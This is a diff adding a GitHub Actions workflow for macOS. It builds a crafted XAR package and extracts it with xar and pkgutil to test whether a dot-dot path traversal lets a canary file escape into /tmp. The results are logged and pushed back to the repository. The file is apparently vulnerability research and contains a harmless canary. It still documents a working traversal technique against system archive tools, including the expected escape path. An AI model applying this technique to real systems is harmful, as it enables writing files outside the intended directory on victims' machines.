@@ -1,0 +1,99 @@
+name: gate_a_nested_run39
+on:
+  workflow_dispatch:
+jobs:
+  gate_a_nested:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build dot-dot XAR archive
+        run: |
+          cc -o build_xar_r39 build_xar_r39.c -lz -framework Security
+          ./build_xar_r39
+          file gate_a39.pkg
+          echo "=== TOC XML ==="
+          python3 -c $'import zlib,struct\nf=open("gate_a39.pkg","rb")\nhdr=f.read(28)\ntoc_cz_len=struct.unpack(">Q",hdr[8:16])[0]\ntoc_cz=f.read(toc_cz_len)\nprint(zlib.decompress(toc_cz).decode())'
+
+      - name: System info
+        run: |
+          sw_vers
+          xar --version 2>&1 || true
+          echo "=== /tmp before extraction ==="
+          ls -la /tmp/ | head -30
+
+      - name: GATE A - xar CLI (isolated)
+        run: |
+          LOG="/tmp/run39_xar.log"
+          EXTRACT_DIR=$(mktemp -d /tmp/gate_a39_xar.XXXXXX)
+          CANARY_TMP=/tmp/xar_gated_canary_macos.txt
+
+          echo "=== GATE A xar PRE-CHECK ===" | tee "$LOG"
+          [ -f "$CANARY_TMP" ] && echo "PRE_XAR=PRESENT" || echo "PRE_XAR=ABSENT" | tee -a "$LOG"
+
+          echo "=== GATE A xar EXTRACT ===" | tee -a "$LOG"
+          xar -xvf gate_a39.pkg -C "$EXTRACT_DIR" 2>&1 | tee -a "$LOG" || true
+          echo "xar exit: $?" | tee -a "$LOG"
+
+          echo "=== extraction dir contents ===" | tee -a "$LOG"
+          ls -laR "$EXTRACT_DIR" 2>&1 | tee -a "$LOG"
+
+          echo "=== find canary anywhere in /tmp ===" | tee -a "$LOG"
+          find /tmp -name "xar_gated_canary_macos.txt" 2>/dev/null | tee -a "$LOG" || true
+
+          echo "=== CANARY CHECK ===" | tee -a "$LOG"
+          if [ -f "$CANARY_TMP" ]; then
+            echo "PRESENT" | tee -a "$LOG"
+            cat "$CANARY_TMP" | tee -a "$LOG"
+            echo "GATE_A_SYSXAR=PASS" | tee -a "$LOG"
+          else
+            echo "ABSENT" | tee -a "$LOG"
+            echo "GATE_A_SYSXAR=FAIL" | tee -a "$LOG"
+            exit 1
+          fi
+
+      - name: GATE A - pkgutil (always runs)
+        if: always()
+        run: |
+          LOG="/tmp/run39_pkgutil.log"
+          TMP_DIR=$(mktemp -d /tmp/gate_a39_pkgutil.XXXXXX)
+          CANARY_TMP=/tmp/xar_gated_canary_macos.txt
+
+          echo "=== GATE A pkgutil PRE-CHECK ===" | tee "$LOG"
+          [ -f "$CANARY_TMP" ] && echo "PRE_PKGUTIL=PRESENT" || echo "PRE_PKGUTIL=ABSENT" | tee -a "$LOG"
+          echo "OUTDIR will be: $TMP_DIR/out" | tee -a "$LOG"
+          echo "Expected traversal: $TMP_DIR/out/../../xar_gated_canary_macos.txt = /tmp/xar_gated_canary_macos.txt" | tee -a "$LOG"
+
+          echo "=== GATE A pkgutil EXPAND ===" | tee -a "$LOG"
+          pkgutil --expand gate_a39.pkg "$TMP_DIR/out" 2>&1 | tee -a "$LOG" || true
+          echo "pkgutil exit: $?" | tee -a "$LOG"
+
+          echo "=== pkgutil extraction dir ===" | tee -a "$LOG"
+          ls -laR "$TMP_DIR" 2>&1 | tee -a "$LOG" || true
+
+          echo "=== find canary anywhere in /tmp ===" | tee -a "$LOG"
+          find /tmp -name "xar_gated_canary_macos.txt" 2>/dev/null | tee -a "$LOG" || true
+
+          echo "=== canary in /tmp ===" | tee -a "$LOG"
+          if [ -f "$CANARY_TMP" ]; then
+            echo "GATE_A_PKGUTIL=PASS" | tee -a "$LOG"
+            cat "$CANARY_TMP" | tee -a "$LOG"
+          else
+            echo "Step failing: GATE_A_PKGUTIL=FAIL" | tee -a "$LOG"
+            exit 1
+          fi
+
+      - name: Collect and push results
+        if: always()
+        run: |
+          cat /tmp/run39_xar.log /tmp/run39_pkgutil.log > run39_results.log 2>/dev/null || true
+          git add run39_results.log
+          git commit -m "Run 39 results — dot-dot traversal Gate A [ci skip]" || true
+          git push "https://${{ secrets.GITHUB_TOKEN }}@github.com/YuvalFradkin1/new2.git" master || true
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: run39-dotdot-traversal-macos
+          path: run39_results.log
